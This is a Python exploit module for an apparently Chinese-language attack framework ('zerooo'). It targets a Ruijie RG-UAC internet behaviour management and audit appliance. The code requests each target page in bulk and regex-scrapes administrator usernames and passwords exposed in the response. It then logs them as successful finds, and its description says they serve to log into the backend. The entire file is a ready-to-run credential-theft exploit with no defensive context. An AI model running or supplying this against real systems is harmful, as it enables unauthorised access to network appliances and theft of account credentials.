import re

from zerooo.core.asyncpool import async_run
from zerooo.core.log import LOGGER
from zerooo.core.options import Option, OptArgset
from zerooo.request.httpclient import HttpClient
from zerooo.utils.util import get_url


class Zerooosploit(Option):

    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            'Name': '锐捷RG-UAC统一上网行为管理审计系统存在账号密码信息泄露',
            'Module': 'exploit/ruijie/rg-uac-passleak',
            'Product': '锐捷RG-UAC统一上网行为管理审计系统',
            'Cve': '',
            'Create_date': '20210411',
            'Description': '锐捷RG-UAC统一上网行为管理审计系统存在账号密码信息泄露,可以间接获取用户账号密码信息登录后台',
            'Authors': '',
            'References': ''
        }

        self.option = {
            'url': {'Current Setting': OptArgset.url, 'Required': 'yes', 'Description': '目标url，多个目标请用,分开'},
            'limit': {'Current Setting': None, 'Required': 'no', 'Description': '并发限制（默认根据当前系统自动调整）'}
        }

    async def rg_uac_passleak(self, target):
        resp = await HttpClient().send_request_cgi('GET', url=target)
        return resp

    def rg_uac_passleak_callback(self, future):
        resp = future.result()
        if resp['code'] == 200:
            result = resp['text']
            user = re.findall('"name":"(.*?)"', result)
            password = re.findall('"password":"(.*?)"', result)
            if user:
                for i in range(len(user)):
                    msg = f'name:{user[i]},password:{password[i]}'
                    LOGGER.success(msg)
            else:
                msg = 'The target ' + str(resp['url']) + ' not vuln !'
                LOGGER.info(msg)

        else:
            msg = 'The target ' + str(resp['url']) + ' not vuln !'
            LOGGER.info(msg)

    def exploit(self):
        urls = get_url(self.get_options('url'))
        limit = self.get_options('limit')
        async_run(self.rg_uac_passleak, urls, self.rg_uac_passleak_callback, limit)
        LOGGER.info('exploit complete')
